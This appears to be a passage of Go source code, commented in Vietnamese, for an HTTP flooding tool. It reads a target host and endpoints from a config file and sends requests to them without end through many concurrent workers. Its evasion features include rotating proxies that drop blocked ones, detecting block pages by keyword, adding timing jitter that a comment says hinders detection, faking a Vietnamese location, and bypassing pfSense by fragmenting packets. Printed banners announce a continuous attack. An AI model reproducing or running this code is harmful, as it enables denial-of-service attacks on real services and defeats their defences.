			// Kiểm tra các dạng chặn khác nhau
			blockTerms := []string{
				"access denied", "geo", "location", "block", "restricted",
				"not available", "unavailable", "forbidden", "banned",
				"country", "region", "unauthorized", "firewalled",
				"vpn detected", "proxy detected", "cloudflare",
			}

			isBlocked := false
			for _, term := range blockTerms {
				if strings.Contains(bodyLower, term) {
					isBlocked = true
					fmt.Printf("❌ Client %d bị chặn: Phát hiện '%s' trong response\n", clientID, term)
					break
				}
			}

			// Nếu status code là 403, 429 hoặc chuỗi bị chặn được tìm thấy
			if resp.StatusCode == 403 || resp.StatusCode == 429 || isBlocked {
				atomic.AddInt64(&stats.blockedRequests, 1)
				fmt.Printf("❌ Client %d bị chặn: Status code %d\n", clientID, resp.StatusCode)

				// Đánh dấu proxy này có vấn đề nếu đang sử dụng proxy
				if usingProxy && proxy.Host != "" {
					blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
					proxyPool.disableProxy(proxy, blacklistTime)
					fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist do bị chặn\n", proxy.Host, proxy.Port)
				}
				continue
			}
		}

		// Thành công!
		fmt.Printf("Client %d (GET) nhận phản hồi: %s\n", clientID, resp.Status)

		// Tăng số lượng request thành công
		atomic.AddInt64(&stats.successfulRequests, 1)
		if usingProxy {
			atomic.AddInt64(&stats.proxyRequests, 1)
		} else {
			atomic.AddInt64(&stats.directRequests, 1)
		}

		success = true
	}

	if !success {
		fmt.Printf("⚠️ Client %d đã hết số lần thử, không thể kết nối\n", clientID)
		atomic.AddInt64(&stats.failedRequests, 1)
	}
}

// Tạo chuỗi ngẫu nhiên có độ dài xác định
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func main() {
	// =============================================
	// TỰ ĐỘNG ĐỌC CẤU HÌNH TỪ FILE CONFIG.TXT
	// =============================================

	fmt.Println("📖 Đang đọc cấu hình từ file config.txt...")
	config, err := loadConfig("config.txt")
	if err != nil {
		fmt.Printf("⚠️  Lỗi đọc config: %v, sử dụng cấu hình mặc định\n", err)
	}

	// Sử dụng cấu hình từ file
	TARGET_SERVER := config.TargetServer
	TARGET_PORT := config.TargetPort
	PROTOCOL := config.Protocol
	TARGET_ENDPOINTS := config.Endpoints
	maxConcurrent := config.MaxConcurrent
	delayMs := config.DelayMs

	// =============================================
	// TỰ ĐỘNG TẠO FULL URLs TỪ CẤU HÌNH
	// =============================================

	var endpoints []string

	// Tạo full URLs từ cấu hình
	for _, endpoint := range TARGET_ENDPOINTS {
		if TARGET_PORT == "443" && PROTOCOL == "https" {
			// HTTPS port 443 không cần ghi port
			endpoints = append(endpoints, fmt.Sprintf("%s://%s%s", PROTOCOL, TARGET_SERVER, endpoint))
		} else if TARGET_PORT == "80" && PROTOCOL == "http" {
			// HTTP port 80 không cần ghi port
			endpoints = append(endpoints, fmt.Sprintf("%s://%s%s", PROTOCOL, TARGET_SERVER, endpoint))
		} else {
			// Các port khác cần ghi rõ
			endpoints = append(endpoints, fmt.Sprintf("%s://%s:%s%s", PROTOCOL, TARGET_SERVER, TARGET_PORT, endpoint))
		}
	}

	// Khởi tạo thống kê
	stats := &Stats{}

	// Đọc danh sách proxy
	proxyPool, err := loadProxies("proxies.txt")
	if err != nil {
		fmt.Printf("⚠️ Lỗi khi đọc file proxy: %v - Tiếp tục với kết nối trực tiếp\n", err)
	}

	if proxyPool == nil || len(proxyPool.proxies) == 0 {
		fmt.Println("⚠️ Không có proxy nào được tải - Sẽ sử dụng kết nối trực tiếp (IP thật)")
	} else {
		fmt.Printf("✅ Đã tải %d proxy từ file\n", len(proxyPool.proxies))
	}

	fmt.Printf("🎯 TARGET: %s:%s (%s)\n", TARGET_SERVER, TARGET_PORT, PROTOCOL)
	fmt.Printf("📍 ENDPOINTS: %v\n", TARGET_ENDPOINTS)
	fmt.Printf("🚀 BẮT ĐẦU TẤN CÔNG LIÊN TỤC VỚI CHẾ ĐỘ HỖN HỢP (PROXY + IP THẬT)!\n")
	fmt.Printf("💪 ĐA LUỒNG: %d kết nối đồng thời\n", maxConcurrent)
	fmt.Printf("🔄 PROXY POOL: %d proxy với quản lý sức khỏe tự động\n", len(proxyPool.proxies))
	fmt.Printf("🇻🇳 FAKE LOCATION: Việt Nam (VN) với nhiều cơ chế giả mạo nâng cao\n")
	fmt.Println("⚠️  Nhấn Ctrl+C để dừng chương trình")

	start := time.Now()

	// Tạo hai channel cho hai loại kết nối
	jobChan := make(chan struct {
		clientID int
		endpoint string
	}, maxConcurrent*2)
	semaphore := make(chan struct{}, maxConcurrent) // Channel để giới hạn goroutines

	// Khởi tạo biến đếm goroutine hiện tại
	var activeRequests int32 = 0

	// In thống kê mỗi 30 giây
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		// Biến để theo dõi hiệu suất
		var lastSuccessCount int64 = 0
		var lastErrorCount int64 = 0
		var lastTotalRequests int64 = 0
		var lastTime = time.Now()

		for {
			select {
			case <-ticker.C:
				now := time.Now()
				totalTime := now.Sub(start)
				elapsedSince := now.Sub(lastTime)

				// Tính tốc độ hiện tại
				currentSuccessCount := atomic.LoadInt64(&stats.successCount)
				currentErrorCount := atomic.LoadInt64(&stats.errorCount)
				currentTotalRequests := atomic.LoadInt64(&stats.totalRequests)

				successRate := float64(currentSuccessCount-lastSuccessCount) / elapsedSince.Seconds()
				errorRate := float64(currentErrorCount-lastErrorCount) / elapsedSince.Seconds()
				requestRate := float64(currentTotalRequests-lastTotalRequests) / elapsedSince.Seconds()

				// Cập nhật giá trị cho lần sau
				lastSuccessCount = currentSuccessCount
				lastErrorCount = currentErrorCount
				lastTotalRequests = currentTotalRequests
				lastTime = now

				// Tính hiệu suất
				var successPercentage float64 = 0
				if currentTotalRequests > 0 {
					successPercentage = float64(currentSuccessCount) / float64(currentTotalRequests) * 100
				}

				// Đếm proxy khả dụng
				var availableProxies int = 0
				if proxyPool != nil {
					proxyPool.mutex.Lock()
					for i := range proxyPool.proxies {
						if proxyPool.proxies[i].isAvailable() {
							availableProxies++
						}
					}
					proxyPool.mutex.Unlock()
				}

				// Hiển thị thống kê chi tiết hơn
				fmt.Printf("\n=== THỐNG KÊ HIỆN TẠI (sau %v) ===\n", totalTime)
				fmt.Printf("Tổng số requests: %d (%.2f requests/giây)\n",
					currentTotalRequests, requestRate)
				fmt.Printf("Thành công: %d (%.2f/giây - %.2f%%)\n",
					currentSuccessCount, successRate, successPercentage)
				fmt.Printf("Lỗi: %d (%.2f/giây)\n",
					currentErrorCount, errorRate)
				fmt.Printf("Sử dụng proxy: %d\n", atomic.LoadInt64(&stats.proxyUsedCount))
				fmt.Printf("Kết nối trực tiếp: %d\n", atomic.LoadInt64(&stats.directUsedCount))
				fmt.Printf("Số luồng đang hoạt động: %d (max: %d/%d)\n",
					atomic.LoadInt32(&activeRequests),
					atomic.LoadInt32(&stats.maxGoroutines),
					maxConcurrent)

				if proxyPool != nil {
					fmt.Printf("Proxy khả dụng: %d/%d\n",
						availableProxies, len(proxyPool.proxies))
				}

				if stats.successCount > 0 {
					avgDuration := time.Duration(atomic.LoadInt64(&stats.totalDuration) / atomic.LoadInt64(&stats.successCount))
					fmt.Printf("Thời gian phản hồi trung bình: %v\n", avgDuration)
				}
				fmt.Println("=======================================")
			}
		}
	}()

	// Khởi tạo worker pool - cách hiệu quả hơn để quản lý goroutines
	// Số lượng worker bằng với maxConcurrent
	for i := 0; i < maxConcurrent; i++ {
		go func(workerID int) {
			for job := range jobChan {
				// Đánh dấu một goroutine đang hoạt động
				current := atomic.AddInt32(&activeRequests, 1)

				// Cập nhật số lượng goroutine tối đa
				for {
					max := atomic.LoadInt32(&stats.maxGoroutines)
					if current <= max {
						break
					}
					if atomic.CompareAndSwapInt32(&stats.maxGoroutines, max, current) {
						break
					}
				}

				semaphore <- struct{}{} // Chiếm một slot

				// Thực hiện công việc
				var dummyWG sync.WaitGroup
				dummyWG.Add(1)
				sendHTTPRequest(job.endpoint, job.clientID, stats, &dummyWG, proxyPool, config)

				// Giải phóng tài nguyên
				<-semaphore
				atomic.AddInt32(&activeRequests, -1)
			}
		}(i)
	}

	// Vòng lặp vô hạn - gửi requests liên tục
	clientID := 1
	for {
		// Chọn endpoint ngẫu nhiên để tấn công
		endpoint := endpoints[rand.Intn(len(endpoints))]

		// Gửi công việc vào channel
		select {
		case jobChan <- struct {
			clientID int
			endpoint string
		}{clientID: clientID, endpoint: endpoint}:
			// Công việc đã được đưa vào hàng đợi
		default:
			// Nếu channel đầy, đợi một chút rồi thử lại
			time.Sleep(time.Duration(rand.Intn(10)+1) * time.Millisecond)
			continue
		}

		clientID++

		// Delay nhỏ với độ jitter ngẫu nhiên để tránh quá tải và khó phát hiện mẫu
		if delayMs > 0 && clientID%(maxConcurrent/2) == 0 {
			jitterDelay := time.Duration(rand.Intn(delayMs*2)+1) * time.Millisecond
			time.Sleep(jitterDelay)
		}
	}

	// In thông tin về chế độ bypass pfSense
	if config.PfSenseBypass {
		fmt.Println("🛡️ PFSENSE BYPASS: Đã kích hoạt (Sử dụng các kỹ thuật đặc biệt)")
		if config.FragmentPackets {
			fmt.Println("📦 FRAGMENT PACKETS: Đã kích hoạt (Chia nhỏ gói tin)")
		}
		fmt.Printf("🔄 TTL BYPASS: %d\n", config.TTLBypass)
	}
}
